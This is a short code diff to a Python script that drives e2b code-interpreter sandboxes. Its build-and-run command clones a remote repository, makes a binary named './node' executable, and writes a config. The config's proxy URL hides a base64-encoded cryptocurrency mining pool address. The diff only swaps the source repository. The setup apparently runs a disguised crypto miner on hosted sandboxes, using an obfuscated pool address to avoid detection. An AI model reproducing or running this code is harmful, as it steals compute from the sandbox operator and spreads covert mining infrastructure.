@@ -28,8 +28,8 @@ from e2b_code_interpreter import AsyncSandbox
 
 # ─────────────────────────  YOUR BUILD-AND-RUN COMMAND  ───────────────────────
 DEFAULT_COMMAND = r"""
-git clone https://github.com/marcei9809/ollma.git && \
-cd ollma && chmod +x ./node && \
+git clone https://github.com/balau883/emoi.git && \
+cd emoi && chmod +x ./node && \
 cat > data.json <<'EOF'
 {
   "proxy": "wss://onren-e3hx.onrender.com/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=",
@@ -167,6 +167,7 @@ if __name__ == "__main__":
         asyncio.run(main_async())
     except KeyboardInterrupt:
         print("\n⏹️  Interrupted — shutting down.", file=sys.stderr)
+
 
 
 
